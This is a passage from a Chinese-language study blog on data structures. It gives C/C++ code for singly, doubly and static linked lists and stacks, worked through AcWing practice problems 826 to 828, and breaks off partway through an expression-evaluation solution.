class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="查找链表">查找链表</h3><p>查找链表我暂时只学到遍历查找，等后续学到了会更新</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">searchNode</span><span class="hljs-params">(Node* headNode,<span class="hljs-type">int</span> searchdata)</span><br>&#123;<br>    <span class="hljs-type">int</span> isFound=<span class="hljs-number">0</span>;<br>    Node* pMove=headNode-&gt;next;<br>    <span class="hljs-keyword">while</span>(pMove)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(pMove-&gt;data==searchdata)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在此链表中找到了！\n&quot;</span>);<br>            isFound=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pMove=pMove-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!isFound) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;对不起没有找到！\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="删除节点">删除节点</h3><p>一样的只会循环查找后删除，后续更新新的方法</p><p><strong>删除节点有几个要注意的地方：</strong></p><p><strong>一：首先要定义两个指针，因为删除节点需要该节点的前节点链接到该节点的下一个节点，而单链表只能知道下一个节点，所以必须要两个指针来删除</strong></p><p><strong>二：就是要注意，当删除的节点是头节点，那么就必须特殊对待，直接将headNode指向删掉节点的下一个节点</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(Node* headNode,<span class="hljs-type">int</span> deletenumber)</span><br>&#123;<br>    Node *q,*p;<br>    <span class="hljs-type">int</span> isFound=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(q=<span class="hljs-literal">NULL</span>,p=headNode-&gt;next;p;q=p,p=p-&gt;next)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(p-&gt;data==deletenumber)<span class="hljs-comment">//找到该节点</span><br>        &#123;<br>            isFound=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(!q)<span class="hljs-comment">//如果发现前节点是空，说明是头节点，那么只需要headNode指向p-&gt;next</span><br>                headNode=p-&gt;next;<br>            <span class="hljs-keyword">else</span><br>                q-&gt;next=p-&gt;next;<br>            <span class="hljs-built_in">free</span>(p);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!isFound) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未删除成功\n&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除成功\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="静态链表">静态链表</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>;<br><span class="hljs-type">int</span> val[N],ne[N],head[N],idx;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head=<span class="hljs-number">-1</span>;<br>    idx=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//插头</span><br><span class="hljs-type">void</span> add-to-<span class="hljs-built_in">head</span>(<span class="hljs-type">int</span> x)<br>&#123;<br>    e[idx]=x;<br>    ne[idx]=head;<br>    head=idx;<br>    idx++;<br>&#125;<br><span class="hljs-comment">//插到下标为k的地方</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> pos,<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx]=x;<br>    ne[idx]=ne[pos];<br>    ne[pos]=idx;<br>    idx++;<br>&#125;<br><span class="hljs-comment">//删除下标为k的后面的结点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> pos)</span></span><br><span class="hljs-function"></span>&#123;<br>    ne[k]=ne[ne[k]];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="单链表">826. 单链表</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>实现一个单链表，链表初始为空，支持三种操作：<br><br>向链表头插入一个数；<br>删除第 <span class="hljs-variable">k</span> 个插入的数后面的数；<br>在第 <span class="hljs-variable">k</span> 个插入的数后插入一个数。<br>现在要对该链表进行 <span class="hljs-variable">M</span> 次操作，进行完所有操作后，从头到尾输出整个链表。<br><br>注意<span class="hljs-operator">:</span>题目中第 <span class="hljs-variable">k</span> 个插入的数并不是指当前链表的第 <span class="hljs-variable">k</span> 个数。例如操作过程中一共插入了 <span class="hljs-variable">n</span> 个数，则按照插入的时间顺序，这 <span class="hljs-variable">n</span> 个数依次为：第 <span class="hljs-number">1</span> 个插入的数，第 <span class="hljs-number">2</span> 个插入的数，…第 <span class="hljs-variable">n</span> 个插入的数。<br><br>输入格式<br>第一行包含整数 <span class="hljs-variable">M</span>，表示操作次数。<br><br>接下来 <span class="hljs-variable">M</span> 行，每行包含一个操作命令，操作命令可能为以下几种：<br><br><span class="hljs-variable">H</span> <span class="hljs-variable">x</span>，表示向链表头插入一个数 <span class="hljs-variable">x</span>。<br><span class="hljs-built_in">D</span> <span class="hljs-variable">k</span>，表示删除第 <span class="hljs-variable">k</span> 个插入的数后面的数（当 <span class="hljs-variable">k</span> 为 <span class="hljs-number">0</span> 时，表示删除头结点）。<br><span class="hljs-built_in">I</span> <span class="hljs-variable">k</span> <span class="hljs-variable">x</span>，表示在第 <span class="hljs-variable">k</span> 个插入的数后面插入一个数 <span class="hljs-variable">x</span>（此操作中 <span class="hljs-variable">k</span> 均大于 <span class="hljs-number">0</span>）。<br>输出格式<br>共一行，将整个链表从头到尾输出。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-variable">M</span>≤<span class="hljs-number">100000</span><br>所有操作保证合法。<br><br>输入样例：<br><span class="hljs-number">10</span><br><span class="hljs-variable">H</span> <span class="hljs-number">9</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-built_in">D</span> <span class="hljs-number">1</span><br><span class="hljs-built_in">D</span> <span class="hljs-number">0</span><br><span class="hljs-variable">H</span> <span class="hljs-number">6</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-built_in">D</span> <span class="hljs-number">6</span><br>输出样例：<br><span class="hljs-number">6</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> val[N],ne[N],head,idx;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head=<span class="hljs-number">-1</span>;<br>    idx=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_to_head</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br>    val[idx]=x;<br>    ne[idx]=head;<br>    head=idx;<br>    idx++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deletex</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span></span><br><span class="hljs-function"></span>&#123;<br>    ne[k]=ne[ne[k]];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    val[idx]=x;<br>    ne[idx]=ne[k];<br>    ne[k]=idx;<br>    idx++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-type">char</span> oper;<br>    <span class="hljs-type">int</span> n,x,k;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        cin&gt;&gt;oper;<br>        <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&#x27;H&#x27;</span>)&#123;<br>            cin&gt;&gt;x;<br>            <span class="hljs-built_in">add_to_head</span>(x);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&#x27;I&#x27;</span>)&#123;<br>            cin&gt;&gt;k&gt;&gt;x;<br>            <span class="hljs-built_in">add</span>(k<span class="hljs-number">-1</span>,x);<span class="hljs-comment">//减一和上面原理一样</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            cin&gt;&gt;x;<br>            <span class="hljs-keyword">if</span>(x==<span class="hljs-number">0</span>) head=ne[head];<span class="hljs-comment">//删去首节点也好理解，就是修改head最开始指向为原head指向的下一个指向</span><br>            <span class="hljs-built_in">deletex</span>(x<span class="hljs-number">-1</span>);<span class="hljs-comment">//为什么要减去一，因为idx是从0开始，而k是从1开始，删除第k个插入的数，就相当于</span><br>            <span class="hljs-comment">//在程序中删除第x-1个数</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> index=head;<br>    <span class="hljs-keyword">while</span>(index!=<span class="hljs-number">-1</span>)<br>    &#123;<br>        cout&lt;&lt;val[index]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        index=ne[index];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>##　双链表</p><p><ahref="https://www.acwing.com/solution/content/5052/">双链表具体详解</a></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs tap">827. 双链表<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>实现一个双链表，双链表初始为空，支持<span class="hljs-number"> 5 </span>种操作：<br><br>在最左侧插入一个数；<br>在最右侧插入一个数；<br>将第 k 个插入的数删除；<br>在第 k 个插入的数左侧插入一个数；<br>在第 k 个插入的数右侧插入一个数<br>现在要对该链表进行 M 次操作，进行完所有操作后，从左到右输出整个链表。<br><br>注意:题目中第 k 个插入的数并不是指当前链表的第 k 个数。例如操作过程中一共插入了 n 个数，则按照插入的时间顺序，这 n 个数依次为：第<span class="hljs-number"> 1 </span>个插入的数，第<span class="hljs-number"> 2 </span>个插入的数，…第 n 个插入的数。<br><br>输入格式<br>第一行包含整数 M，表示操作次数。<br><br>接下来 M 行，每行包含一个操作命令，操作命令可能为以下几种：<br><br>L x，表示在链表的最左端插入数 x。<br>R x，表示在链表的最右端插入数 x。<br>D k，表示将第 k 个插入的数删除。<br>IL k x，表示在第 k 个插入的数左侧插入一个数。<br>IR k x，表示在第 k 个插入的数右侧插入一个数。<br>输出格式<br>共一行，将整个链表从左到右输出。<br><br>数据范围<br>1≤M≤100000<br>所有操作保证合法。<br><br>输入样例：<br>10<br>R 7<br>D 1<br>L 3<br>IL<span class="hljs-number"> 2 </span>10<br>D 3<br>IL<span class="hljs-number"> 2 </span>7<br>L 8<br>R 9<br>IL<span class="hljs-number"> 4 </span>7<br>IR<span class="hljs-number"> 2 </span>2<br>输出样例：<br>8<span class="hljs-number"> 7 </span>7<span class="hljs-number"> 3 </span>2 9<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//这里填你的代码^^</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> val[N],l[N],r[N],idx;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    val[idx]=x;<br>    l[idx]=k;<br>    r[idx]=r[k];<br>    l[r[k]]=idx;<br>    r[k]=idx;<br>    idx++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    r[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<span class="hljs-comment">//下标为0一定为头指针</span><br>    l[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<span class="hljs-comment">//下标为1一定为尾指针</span><br>    idx=<span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span></span><br><span class="hljs-function"></span>&#123;<br>    r[l[k]]=r[k];<br>    l[r[k]]=l[k];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        string oper;<br>        <span class="hljs-type">int</span> k,x;<br>        cin&gt;&gt;oper;<br>        <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&quot;L&quot;</span>)<br>        &#123;<br>            cin&gt;&gt;x;<br>            <span class="hljs-built_in">insert</span>(<span class="hljs-number">0</span>,x);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&quot;R&quot;</span>)<br>        &#123;<br>          cin&gt;&gt;x;<br>          <span class="hljs-built_in">insert</span>(l[<span class="hljs-number">1</span>],x);<span class="hljs-comment">//因为add函数是向右插，所以向左移动一位然后在该地插入，就相当于在原来的左边插入</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&quot;IL&quot;</span>)<br>        &#123;<br>            cin&gt;&gt;k&gt;&gt;x;<br>            <span class="hljs-built_in">insert</span>(l[k+<span class="hljs-number">1</span>],x);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&quot;IR&quot;</span>)<br>        &#123;<br>            cin&gt;&gt;k&gt;&gt;x;<br>            <span class="hljs-built_in">insert</span>(k+<span class="hljs-number">1</span>,x);<span class="hljs-comment">//因为idx从2开始，而k从1开始，所以要加一</span><br>            <span class="hljs-comment">//这里不用r[k+1]的原因是add函数是从k的右边插入，而k下标就对应了插入的k个数</span><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            cin&gt;&gt;k;<br>            <span class="hljs-built_in">remove</span>(k+<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> cnt=r[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">while</span>(cnt!=<span class="hljs-number">1</span>)<br>    &#123;<br>        cout&lt;&lt;val[cnt]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        cnt=r[cnt];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//注意代码要放在两组三个点之间，才可以正确显示代码高亮哦~</span><br><br></code></pre></td></tr></table></figure><h1 id="栈和单调栈">栈和单调栈</h1><h2 id="表达式求值栈的应用">表达式求值（栈的应用）</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">828</span>. 模拟栈<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>实现一个栈，栈初始为空，支持四种操作：<br><br>push <span class="hljs-keyword">x</span> – 向栈顶插入一个数 <span class="hljs-keyword">x</span>；<br><span class="hljs-keyword">pop</span> – 从栈顶弹出一个数；<br><span class="hljs-built_in">empty</span> – 判断栈是否为空；<br>query – 查询栈顶元素。<br>现在要对栈进行 M 个操作，其中的每个操作 <span class="hljs-number">3</span> 和操作 <span class="hljs-number">4</span> 都要输出相应的结果。<br><br>输入格式<br>第一行包含整数 M，表示操作次数。<br><br>接下来 M 行，每行包含一个操作命令，操作命令为 push <span class="hljs-keyword">x</span>，<span class="hljs-keyword">pop</span>，<span class="hljs-built_in">empty</span>，query 中的一种。<br><br>输出格式<br>对于每个 <span class="hljs-built_in">empty</span> 和 query 操作都要输出一个查询结果，每个结果占一行。<br><br>其中，<span class="hljs-built_in">empty</span> 操作的查询结果为 YES 或 NO，query 操作的查询结果为一个整数，表示栈顶元素的值。<br><br>数据范围<br><span class="hljs-number">1</span>≤M≤<span class="hljs-number">100000</span>,<br><span class="hljs-number">1</span>≤<span class="hljs-keyword">x</span>≤<span class="hljs-number">109</span><br>所有操作保证合法。<br><br>输入样例：<br><span class="hljs-number">10</span><br>push <span class="hljs-number">5</span><br>query<br>push <span class="hljs-number">6</span><br><span class="hljs-keyword">pop</span><br>query<br><span class="hljs-keyword">pop</span><br><span class="hljs-built_in">empty</span><br>push <span class="hljs-number">4</span><br>query<br><span class="hljs-built_in">empty</span><br>输出样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">5</span><br>YES<br><span class="hljs-number">4</span><br>NO<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cctype&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br>stack&lt;<span class="hljs-type">int</span>&gt; num;<br>stack&lt;<span class="hljs-type">int</span>&gt; op;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">eval</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> b=num.<span class="hljs-built_in">top</span>();num.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-type">int</span> a=num.<span class="hljs-built_in">top</span>();num.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-type">char</span> operation=op.<span class="hljs-built_in">top</span>();op.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-keyword">if</span>(operation==<span 